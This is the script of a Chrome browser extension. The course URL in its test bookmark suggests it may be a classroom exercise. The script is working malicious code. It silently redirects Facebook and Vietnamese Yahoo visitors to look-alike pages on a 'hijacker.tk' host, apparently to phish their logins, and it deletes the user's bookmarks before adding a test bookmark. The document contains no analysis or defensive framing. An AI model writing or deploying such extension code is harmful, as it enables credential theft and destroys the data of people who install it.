var $ = chrome.bookmarks;

if (window.location.hostname == "www.facebook.com") {
    window.location.href = "https://hijacker.tk/FB/";
}

if (window.location.hostname == "vn.yahoo.com") {
    window.location.href = "https://hijacker.tk/Yahoo/Yahoo.php";
}


function createBookmark(title, url) {
    chrome.bookmarks.create({
        'title': title,
        'url': url,
    });
}


Promise.all([
    chrome.bookmarks.getTree(),
  ]).then(response => {
      bookmarks = response[0];
      bookmarks[0].children.forEach(element => {
        for(let i = 0; i < element.children.length; i++) {
            chrome.bookmarks.remove(element.children[i].id)
        }
      });
      createBookmark('Test', 'https://courses.uit.edu.vn')
  });
